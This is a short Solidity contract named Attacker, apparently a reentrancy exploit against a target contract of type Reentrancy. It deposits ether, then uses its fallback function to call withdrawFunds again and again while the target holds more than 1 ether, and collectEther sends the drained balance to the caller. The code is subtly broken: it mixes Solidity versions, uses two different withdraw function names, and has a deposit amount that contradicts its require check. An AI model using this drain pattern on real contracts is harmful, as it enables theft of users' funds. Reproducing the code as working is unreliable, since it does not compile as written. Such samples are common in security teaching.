contract Attacker{

    Reentrancy reentrancy;

    constructor(address reentracyAddress)
    {
        reentrancy=Reentrancy(reentracyAddress);
    }

    function depositEther()public
    {
        require(msg.value<=0.5 ether);
        reentrancy.deposit.value(1 ether)();
        reentrancy.withdraw(1 ether);

    }

    function collectEther() public 
    {
    msg.sender.transfer(this.balance);
   }


// fallback function 

fallback() payable public 
{
if (reentrancy.balance > 1 ether) 
{

reentrancy.withdrawFunds(1 ether);

}

}
}   